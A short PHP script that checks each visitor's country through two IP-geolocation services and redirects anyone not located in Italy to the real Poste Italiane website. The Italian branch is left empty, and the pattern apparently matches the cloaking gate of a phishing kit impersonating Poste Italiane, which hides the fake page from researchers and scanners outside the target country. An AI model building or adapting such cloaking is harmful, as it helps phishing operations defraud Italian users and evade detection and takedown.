<?php
    ob_start();
    $ip=$_SERVER['REMOTE_ADDR'];

    $ck = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"));
    $country=$ck->geoplugin_countryCode;

    $ck2 = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
    $country2= $ck2->country; 

 

    if ($country==="IT") {
       
    }

    else if ($country2==="IT"){
         
    }
    else{
        header("Location: http://www.poste.it/");
        exit();
    }


     
?>